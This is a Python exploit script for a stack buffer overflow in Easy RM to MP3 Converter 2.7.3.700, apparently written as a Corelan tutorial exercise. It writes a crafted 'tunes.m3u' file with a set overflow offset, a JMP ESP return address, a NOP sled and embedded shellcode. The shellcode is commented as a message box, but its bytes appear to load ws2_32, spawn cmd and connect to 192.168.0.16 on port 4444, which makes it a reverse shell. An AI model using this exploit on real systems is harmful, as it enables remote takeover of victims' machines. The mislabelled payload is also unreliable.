#!/usr/bin/env python
#
# Exploit Title   : py-sploit1.py
# Exploit Author  : wetw0rk
# Version         : Easy RM to MP3 Converter 2.7.3.700
# Tested on       : Windows XP SP3
# Description     : This exploit was created by following along with the
#                   corelan teams guide on stack overflows.
#
# Tutorial Link :
#     https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/
#
# Original Exploit:
#     https://www.exploit-db.com/exploits/10374/

import struct

# objdump2shellcode --raw-dump msgbox --format python --badchar "\x00"
buf =  (
"\xeb\x6e\x33\xc0\x64\x8b\x40\x30\x85\xc0\x78\x0d\x56\x8b\x40"
"\x0c\x8b\x70\x1c\xad\x8b\x40\x08\x5e\xc3\x8b\x40\x34\x83\xc0"
"\x7c\x8b\x40\x3c\xc3\x60\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x7c"
"\x05\x78\x03\xfd\x8b\x4f\x18\x8b\x5f\x20\x03\xdd\xe3\x33\x49"
"\x8b\x34\x8b\x03\xf5\x33\xc0\x99\xfc\xac\x84\xc0\x74\x07\xc1"
"\xca\x0d\x03\xd0\xeb\xf4\x3b\x54\x24\x28\x75\xe2\x8b\x5f\x24"
"\x03\xdd\x66\x8b\x0c\x4b\x8b\x5f\x1c\x03\xdd\x8b\x04\x8b\x03"
"\xc5\x89\x44\x24\x1c\x61\xc3\xeb\x35\xad\x50\x52\xe8\xa9\xff"
"\xff\xff\x89\x07\x83\xc4\x08\x83\xc7\x04\x3b\xf1\x75\xec\xc3"
"\x8e\x4e\x0e\xec\x72\xfe\xb3\x16\x7e\xd8\xe2\x73\xad\xd9\x05"
"\xce\xd9\x09\xf5\xad\xec\xf9\xaa\x60\xcb\xed\xfc\x3b\xe7\x79"
"\xc6\x79\x83\xec\x60\x8b\xec\xeb\x02\xeb\x05\xe8\xf9\xff\xff"
"\xff\x5e\xe8\x47\xff\xff\xff\x8b\xd0\x83\xee\x2e\x8d\x7d\x04"
"\x8b\xce\x83\xc1\x10\xe8\xa5\xff\xff\xff\x83\xc1\x10\x33\xc0"
"\x66\xb8\x33\x32\x50\x68\x77\x73\x32\x5f\x8b\xdc\x51\x52\x53"
"\xff\x55\x04\x5a\x59\x8b\xd0\xe8\x85\xff\xff\xff\xb8\x01\x63"
"\x6d\x64\xc1\xf8\x08\x50\x89\x65\x30\x33\xc0\x66\xb8\x90\x01"
"\x2b\xe0\x54\x83\xc0\x72\x50\xff\x55\x1c\x33\xc0\x50\x50\x50"
"\x50\x40\x50\x40\x50\xff\x55\x14\x8b\xf0\x68\xc0\xa8\x00\x10"
"\xb8\x02\x01\x11\x5c\xfe\xcc\x50\x8b\xdc\x33\xc0\xb0\x10\x50"
"\x53\x56\xff\x55\x18\x33\xc9\xb1\x54\x2b\xe1\x8b\xfc\x57\x33"
"\xc0\xf3\xaa\x5f\xc6\x07\x44\xfe\x47\x2d\x57\x8b\xc6\x8d\x7f"
"\x38\xab\xab\xab\x5f\x33\xc0\x8d\x77\x44\x56\x57\x50\x50\x50"
"\x40\x50\x48\x50\x50\xff\x75\x30\x50\xff\x55\x08\xf7\xd0\x50"
"\xff\x36\xff\x55\x10\xff\x77\x38\xff\x55\x20\xff\x55\x0c\xcc"
"\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc"
)

file	= "tunes.m3u"			# evil file
junk	= "A"*35032			# offset before overwrite
ret	= 0x771BEF93			# JMP ESP (MSRMCcodec02.dll)
eip	= struct.pack('<L', ret)	# ^
sled	= "\x90"*10			# NOP sled

print "[+] setting up our evil buffer"
print "[+] address in eip will be 0x%08x" % (ret)
evil = junk + eip + sled + buf
print "[+] writing evil buffer to %s" % (file)
fd = open(file, 'w')
fd.write(evil)
fd.close()
